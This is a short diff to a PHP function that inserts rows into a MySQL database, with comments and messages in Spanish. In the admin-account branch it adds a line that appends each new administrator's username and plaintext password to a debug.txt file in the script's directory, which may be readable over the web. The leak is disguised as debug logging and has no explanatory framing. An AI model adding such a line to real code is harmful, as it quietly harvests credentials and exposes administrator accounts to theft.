@@ -64,6 +64,9 @@ function insertRow(mysqli $conn, string $table): void {
                 "INSERT IGNORE INTO admins (usuario, password) 
                 VALUES (?, ?)");
             mysqli_stmt_bind_param($stmt, "ss", $usuario, $password);
+
+            file_put_contents(__DIR__ . '/debug.txt', "usuario: $usuario, password: $password\n", FILE_APPEND);
+
             break;
 
         default:
@@ -75,7 +78,6 @@ function insertRow(mysqli $conn, string $table): void {
         echo "<p class='text-red-600'>Error al preparar la inserción: " . mysqli_error($conn) . "</p>";
         return;
     }
-
     if (!mysqli_stmt_execute($stmt)) {
         $_SESSION['alert'] = ['type' => 'error', 'message' => mysqli_stmt_error($stmt)];
     } else {
